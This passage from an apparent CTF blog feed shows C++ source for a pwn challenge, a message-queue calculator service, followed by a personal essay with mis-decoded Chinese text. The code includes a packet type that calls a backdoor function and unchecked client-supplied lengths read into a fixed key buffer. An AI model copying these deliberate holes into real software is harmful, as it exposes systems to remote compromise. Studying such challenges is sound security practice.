keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">memset</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      string skey<span class="token punctuation">;</span>      string s_corr_id<span class="token punctuation">;</span>      string s_res<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> corr_id<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> packet<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> expr<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> res<span class="token punctuation">;</span>      Q q<span class="token punctuation">;</span>      Data d<span class="token punctuation">;</span>      <span class="token keyword">switch</span><span class="token punctuation">(</span>packet_type<span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// connect</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>starting <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            starting <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> done_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">else</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// declare</span>          uuid_t uuid<span class="token punctuation">;</span>          <span class="token function">uuid_generate</span><span class="token punctuation">(</span>uuid<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">uuid_unparse</span><span class="token punctuation">(</span>uuid<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>          skey <span class="token operator">=</span> key<span class="token punctuation">;</span>          mq<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>pair<span class="token operator">&lt;</span>string<span class="token punctuation">,</span>Q<span class="token operator">></span><span class="token punctuation">(</span>skey<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          packet <span class="token operator">=</span> <span class="token function">construct_result</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> packet<span class="token punctuation">,</span> <span class="token number">36</span><span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// retrieve</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          key_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>key<span class="token punctuation">,</span> key_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          id_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    corr_id <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>id_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">memset</span><span class="token punctuation">(</span>corr_id<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>id_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>corr_id<span class="token punctuation">,</span> id_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>key_len<span class="token operator">+</span>id_len<span class="token operator">!=</span>length<span class="token number">-12</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          skey <span class="token operator">=</span> key<span class="token punctuation">;</span>          s_corr_id <span class="token operator">=</span> corr_id<span class="token punctuation">;</span>          it_find <span class="token operator">=</span> mq<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>skey<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>it_find<span class="token operator">!=</span>mq<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            i <span class="token operator">=</span> mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span> mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>corr_id <span class="token operator">!=</span> s_corr_id<span class="token punctuation">)</span>            <span class="token punctuation">{</span>              <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>              <span class="token comment" spellcheck="true">// å‡ºé˜Ÿ</span>              res_len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>res<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              packet <span class="token operator">=</span> <span class="token function">construct_result</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>res<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> packet<span class="token punctuation">,</span> res_len<span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">break</span><span class="token punctuation">;</span>                         <span class="token punctuation">}</span>          <span class="token punctuation">}</span>          <span class="token keyword">else</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// call</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          key_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>key<span class="token punctuation">,</span> key_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          id_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    corr_id <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>id_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">memset</span><span class="token punctuation">(</span>corr_id<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>id_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>corr_id<span class="token punctuation">,</span> id_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          expr_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    expr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>expr_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">memset</span><span class="token punctuation">(</span>expr<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>expr_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>expr<span class="token punctuation">,</span> expr_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>key_len<span class="token operator">+</span>id_len<span class="token operator">+</span>expr_len<span class="token operator">!=</span>length<span class="token number">-12</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token comment" spellcheck="true">// æ‰§è¡Œè¿ç®—</span>          res <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">memset</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          status <span class="token operator">=</span> <span class="token function">calc</span><span class="token punctuation">(</span>expr<span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>status <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          skey <span class="token operator">=</span> key<span class="token punctuation">;</span>          s_corr_id <span class="token operator">=</span> corr_id<span class="token punctuation">;</span>          s_res <span class="token operator">=</span> res<span class="token punctuation">;</span>          it_find <span class="token operator">=</span> mq<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>skey<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>it_find<span class="token operator">!=</span>mq<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// å…¥é˜Ÿ</span>            d<span class="token punctuation">.</span>corr_id <span class="token operator">=</span> s_corr_id<span class="token punctuation">;</span>            d<span class="token punctuation">.</span>res <span class="token operator">=</span> s_res<span class="token punctuation">;</span>            mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> done_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">else</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// close </span>          <span class="token keyword">return</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// break;</span>        <span class="token keyword">case</span> <span class="token number">6</span><span class="token punctuation">:</span>          <span class="token function">backdoor</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>                  <span class="token keyword">default</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// error</span>          <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  MQ mq<span class="token punctuation">;</span>  <span class="token function">handle</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> mq<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><blockquote><p>ä»Šå¤©å°±æ°´åˆ°è¿™å„¿å§ğŸ˜­ã€‚ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> ç¯å¢ƒéƒ¨ç½² </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Some_words_of_today</title>
      <link href="/2018/10/29/Some-words-of-today/"/>
      <url>/2018/10/29/Some-words-of-today/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="Some-words-of-today"><a href="#Some-words-of-today" class="headerlink" title="Some_words_of_today"></a>Some_words_of_today</h1><blockquote><p>ä»Šæ—¥ä»½é—²æ‰¯ã€‚ğŸ™ƒ</p></blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; ç°åœ¨æ—¶é—´å·²ç»23:06äº†ï¼Œä»Šå¤©ç»™å‡ ä½å­¦å¼Ÿç®€å•è®²äº†ä¸€äº›å°çŸ¥è¯†ï¼ˆè™½ç„¶è‡ªå·±å¾ˆlowï¼Œä½†å¸Œæœ›å­¦å¼Ÿå¯ä»¥å¾ˆå¼ºï¼‰ï¼Œå†™å®Œè¿™ç¯‡æ°´æ–‡å°±ç¡å§ã€‚ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™å¼€å§‹å°±å·²ç»ä¹ æƒ¯äº†è¿™ä¹ˆæ™šç¡ï¼Œè™½ç„¶çŸ¥é“æ™šç¡å•¥çš„ï¼Œç†¬å¤œä»€ä¹ˆçš„å¯¹èº«ä½“ä¸å¥½balabalaï¼Œä½†æ˜¯ç”Ÿæ´»æ‰€è¿«ï¼Œè¢«ç”Ÿæ´»å®‰æ’çš„æ˜æ˜ç™½ç™½ï¼Œè™½ç„¶ç›®å‰å›½å†…è®¡ç®—æœºè¡Œä¸šç°çŠ¶å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://i.loli.net/2018/10/29/5bd722c007501.png" alt=""></p><p>æŠ‘æˆ–æ˜¯å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://i.loli.net/2018/10/29/5bd72383adca2.png" alt=""></p><p>&nbsp; &nbsp; &nbsp; &nbsp; åˆšå…¥å­¦é‚£ä¼šå„¿ï¼Œå¤§å­¦å˜›ï¼Œæ†§æ†¬çš„æ˜¯å•¥ï¼Ÿæ— éå°±æ˜¯åƒå–ç©ä¹ï¼Œäº¤æœ‹å‹ï¼ˆæ‰¾å¥³ç¥¨ï¼Ÿï¼‰ä»¥åŠå°‘éƒ¨åˆ†å­¦ä¹ ã€‚å¯¹å•Šï¼Œå°±æ˜¯è¿™æ ·æ²¡é”™å•Šï¼Œå¤§å®¶éƒ½æ˜¯è¿™ä¹ˆè®¤ä¸ºçš„å˜›ï¼Œä¸€ç›´åˆ°å¤§ä¸€è¿‡å»ä¸€å¤§åŠï¼Œæˆ‘ä¹Ÿæ˜¯å­¦å­¦åœåœï¼Œç©ç©æ¸¸æˆï¼Œ<del>ä»¥åŠä¸€åœºèµ·äºé«˜ä¸­ï¼Œæ­¢äºå¤§ä¸€æœ«ï¼Œç»å†è¿‡ä¸€èµ·ï¼Œä¹Ÿç»å†è¿‡åˆ†ç¦»ï¼Œè¿˜ç»å†è¿‡å¼‚åœ°ï¼Œåƒç”µè§†å‰§ä¸€æ ·çš„æ‹çˆ±</del>,å‘¸å‘¸å‘¸ ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; å¾ˆæ™®éçš„ä¸€ä¸ªç°è±¡æ˜¯ï¼šå¾ˆå¤šåˆšè¸å…¥å¤§å­¦æ ¡é—¨çš„äººï¼Œå°±æƒ³å¼€å§‹æ¥ä¸€åœºè½°è½°çƒˆçƒˆçš„æ‹çˆ±ï¼Œæ¥é‡Šæ”¾è‡ªå·±çš„å¤©æ€§ï¼Œæ‹¥æŠ±å¿ƒä¸­çš„ç¾å¥½ğŸ˜„ï¼Œåˆ°åæ¥å´å¾€å¾€æ˜¯æœ€åˆå¼€å§‹çš„äººèµ°ä¸åˆ°ä¸€å—å„¿ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æˆ–è®¸å¾—åˆ°äº†ä»€ä¹ˆä¸œè¥¿ï¼Œå°±è¯¥å¤±å»ç‚¹å¦å¤–çš„ä»€ä¹ˆä¸œè¥¿ã€‚æ‰€ä»¥é‚£æ®µæ—¶é—´æˆ‘åªæ˜¯ç”Ÿæ´»åœ¨ä¸€ä¸ªå°åœˆå­é‡Œï¼Œè™½ç„¶é”™è¿‡äº†å¾ˆå¤šå¾ˆå¤šçš„ç²¾å½©ï¼Œè™šåº¦äº†äº›è®¸æ—¶æ—¥ï¼Œä½†ä¹Ÿæˆé•¿äº†è®¸å¤šã€‚ç»å†äº†ç§ç§åï¼Œæˆ‘æ‰é€æ¸æ˜ç™½æˆ‘çš„å¤§å­¦ç”Ÿæ´»ï¼Œä¹ƒè‡³äººç”Ÿæ„ä¹‰æ‰€åœ¨ğŸ˜¥ï¼Œé£èŠ±é›ªæœˆä¸è¿‡å¶å°”ï¼Œè‡ªå¼ºä¸æ¯ä¾¿æœ‰è¿œæ–¹ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æ‰€è°“å¤§å­¦è€…ï¼Œéè°“æœ‰å¤§æ¥¼ä¹‹è°“ä¹Ÿï¼Œæœ‰å¤§å¸ˆä¹‹è°“ä¹Ÿï¼Œä½†æ˜¯ç°åœ¨åˆæœ‰å‡ ä¸ªèƒ½åšåˆ°ï¼Ÿã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ä¸å…¶å¥¢æœ›å¹³å°å¦‚ä½•å¦‚ä½•å¸®è‡ªå·±ï¼Œé‚£ä¸ºä½•ä¸â€œå¤©è¡Œå¥ï¼Œå›å­ä»¥è‡ªå¼ºä¸æ¯â€å‘¢ï¼Ÿ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; å¤§å­¦åªæ˜¯ä¸€ä¸ªå¹³å°ï¼Œä¸€ä¸ªç»™ä½ å»ç”Ÿæ´»ï¼Œå»å±•ç¤ºï¼Œå»å®ç°ï¼Œå»åˆ›é€ ï¼Œå»ä½“éªŒç¤¾ä¼šçš„å°ç©ºé—´ã€‚å½“ç„¶ï¼Œå¯èƒ½æŸäº›äººè¿›å…¥å¤§å­¦ä¹‹åï¼Œå•Šæˆ‘çš„å¤§å­¦æ€ä¹ˆæ€ä¹ˆæ ·ï¼Œæ€ä¹ˆæ€ä¹ˆæƒ¨ï¼ŒæŠ±æ€¨èµ„æºä¸å…¬ï¼Œå“€å¹ç¤¾ä¼šå¦‚ä½•ï¼Œç„¶åè½¬èº«åˆæ‰‘è¿›äº†æ¸¸æˆä¸–ç•Œã€‚æƒ³æƒ³å…¶å®ä¹ŸæŒºå‚»çš„ï¼Œä¸å…¬èƒ½æ€æ ·ï¼Ÿè°è®©è‡ªå·±æä¸äº†ä¸€ä¸ªå¥½å¹³å°ï¼Œè°è®©è‡ªå·±å¾—ä¸åˆ°é‚£ç‚¹ä»…æœ‰çš„èµ„æºï¼Œåˆæ˜¯è°åœ¨ä¸€æ¬¡ä¸€æ¬¡å •è½ä¹‹åç»§ç»­å •è½ï¼Ÿé‚£è‚¯å®šæ˜¯è‡ªå·±å’¯ğŸ˜­ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æ‰€ä»¥å¦‚æœè‡ªå·±ä¸å»å®ç°ä¸€ç‚¹èƒ½å¤Ÿå®ç°çš„ä»·å€¼ï¼Œæ¥å°è¯ä¸€ä¸‹è‡ªå·±çš„èƒ½åŠ›ï¼Œé‚£å¦‚ä½•æ‰èƒ½è·å¾—é‚£æ‰€è°“çš„å…¬å¹³ï¼Œå¦‚ä½•å»èå…¥ä½ æ‰¹åˆ¤ï¼Œå“€å¹çš„é‚£ä¸ªç¤¾ä¼šã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æœªæ¥ä¹‹è·¯è™½ç„¶åå·ï¼Œä½†å¸Œæœ›ä¸è¯¸ä½åŒè¡Œä¹‹äººï¼Œå…±åŒå‰è¿›ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; Publish by Yof3ng.</p>]]></content>
      
      
      <categories>
          
          <category> æ‚æ–‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ‚æ–‡ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>wandoucup-ctf</title>
      <link href="/2018/10/28/wandoucup-ctf/"/>
      <url>/2018/10/28/wandoucup-ctf/</url>
      
